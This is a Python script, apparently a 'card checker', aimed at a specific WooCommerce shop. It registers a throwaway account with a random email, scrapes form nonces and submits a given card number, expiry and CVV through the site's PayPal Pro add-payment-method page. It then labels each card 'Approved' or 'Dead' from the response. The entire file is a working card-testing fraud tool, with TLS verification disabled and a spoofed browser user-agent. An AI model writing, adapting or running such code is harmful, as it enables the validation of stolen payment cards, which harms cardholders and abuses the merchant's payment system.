from utilsdf.functions import capture, random_email, clean_text
from httpx import AsyncClient
import urllib.parse


async def zukesito(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        mail = urllib.parse.quote(random_email())

        r = await session.get(
            "https://www.myliporidex.com/my-account/add-payment-method/",
        )
        t = r.text
        rnonce = capture(t, '"woocommerce-register-nonce" value="', '"')

        h2 = {
            "Host": "www.myliporidex.com",
            "origin": "https://www.myliporidex.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.myliporidex.com/my-account/add-payment-method/",
        }

        p2 = f"email={mail}&woocommerce-register-nonce={rnonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register"

        r2 = await session.post(
            "https://www.myliporidex.com/my-account/add-payment-method/",
            headers=h2,
            data=p2,
        )

        h3 = {
            "Host": "www.myliporidex.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "referer": "https://www.myliporidex.com/my-account/add-payment-method/",
        }

        r3 = await session.get(
            "https://www.myliporidex.com/my-account/add-payment-method/",
            headers=h3,
        )
        t3 = r3.text
        anonce = capture(t3, '"woocommerce-add-payment-method-nonce" value="', '"')

        p4 = f"payment_method=paypal_pro&paypal_pro-card-number={cc}&paypal_pro_card_expiration_month={month}&paypal_pro_card_expiration_year={year}&paypal_pro-card-cvc={cvv}&woocommerce-add-payment-method-nonce={anonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"

        r4 = await session.post(
            "https://www.myliporidex.com/my-account/add-payment-method/",
            headers=h2,
            data=p4,
        )
        t4 = r4.text
        msg3 = capture(
            t4, '<div class="woocommerce-notices-wrapper"><ul class="woocommerce-', '"'
        )
        msg2 = capture(
            t4,
            f'<div class="woocommerce-notices-wrapper"><ul class="woocommerce-{msg3}" role="',
            '"',
        )
        msg1 = capture(t4, f'woocommerce-{msg3}" role="{msg2}">', "</li>")
        msg = clean_text(msg1)

        if r4.status_code == 302:
            status = "Approved! ✅"
            msg = "Success -» $0"
        elif "Please enter a valid Credit Card Verification Number." in msg:
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
